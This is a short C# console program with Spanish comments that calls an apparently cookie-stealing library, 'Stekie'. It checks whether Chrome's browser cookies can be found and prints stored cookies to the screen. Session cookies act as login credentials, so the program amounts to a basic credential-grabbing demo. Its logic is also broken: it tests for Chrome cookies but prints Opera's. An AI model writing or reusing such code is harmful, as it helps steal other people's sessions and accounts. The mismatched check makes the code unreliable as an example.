using System;
using Stekie;

namespace myProgram
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (Chrome.cookies.GetBool()) //Verifica si se encontraron las cookies de Chrome
            {
                Console.WriteLine("Cookies Encontradas:");
                Console.WriteLine(Opera.cookies.GetString()); //Si las encuentra las imprime en pantalla
            } else
            {
                Console.WriteLine("Cookies no encontradas."); //Si no las encuentra no hace nada
            }
            Console.WriteLine("[ Enter para continuar ]");
            Console.ReadLine();
        }
    }
}